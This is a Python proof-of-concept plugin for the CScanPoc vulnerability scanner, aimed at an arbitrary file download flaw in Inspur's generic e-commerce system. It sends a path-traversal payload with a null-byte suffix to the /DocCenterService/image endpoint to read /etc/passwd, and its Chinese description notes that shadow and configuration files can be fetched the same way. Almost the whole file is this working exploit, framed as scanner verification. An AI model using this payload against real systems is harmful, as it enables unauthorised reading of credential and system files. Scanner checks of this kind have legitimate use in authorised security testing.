# coding: utf-8

from CScanPoc.thirdparty import requests
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
import urllib2

class Vuln(ABVuln):
    vuln_id = 'Inspur_0005' # 平台漏洞编号，留空
    name = '浪潮通用型电商系统 任意文件下载'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.FILE_DOWNLOAD # 漏洞类型
    disclosure_date = '2015-01-25'  # 漏洞公布时间
    desc = '''
        首先确保photo_id的数字对应的图片存在，之后修改photo_size的值导致下载任意文件（包括passwd、shadow、还有各类敏感配置文件）。
    '''  # 漏洞描述
    ref = 'Unkonwn'  # 漏洞来源
    cnvd_id = 'Unkonwn'  # cnvd漏洞编号
    cve_id = 'Unkonwn'  # cve编号
    product = '浪潮通用型电商系统'  # 漏洞应用名称
    product_version = 'Unkonwn'  # 漏洞应用版本

class Poc(ABPoc):
    poc_id = 'ee3fae5d-0a73-4d95-a75a-be2eebb7f469'
    author = '47bwy'  # POC编写者
    create_date = '2018-05-10'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())

    def verify(self):
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))
            
            #__refer__  = http://www.wooyun.org/bugs/wooyun-2010-093845
            payload = "/DocCenterService/image?photo_size=../../../../../../../../../../etc/passwd%00&photo_id=1"
            verify_url = self.target + payload
            req = requests.get(verify_url)
            
            if req.status_code == 200 and '/bin/bash' in req.text:
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                    target=self.target, name=self.vuln.name))

        except Exception, e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.verify()

if __name__ == '__main__':
    Poc().run()
